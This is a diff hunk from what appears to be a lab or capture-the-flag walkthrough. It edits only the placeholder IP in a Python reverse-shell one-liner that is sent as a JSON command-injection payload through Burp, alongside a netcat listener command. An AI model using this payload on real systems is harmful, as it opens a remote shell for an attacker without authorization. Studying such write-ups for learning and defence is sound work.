@@ -362,7 +362,7 @@ nc -nlvp 4444
 For the reverse shell, I used a classic Python one-liner from Pentest Monkey. This is the final JSON payload I sent in Burp (replacing the `ls` command):
 
 ```json
-{"command":"python3 -c \"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('YOUR_ATTACKER_IP',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])\""}
+{"command":"python3 -c \"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('MY_IP',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])\""}
 ```
 
 After sending the request... tada, we got a shell!
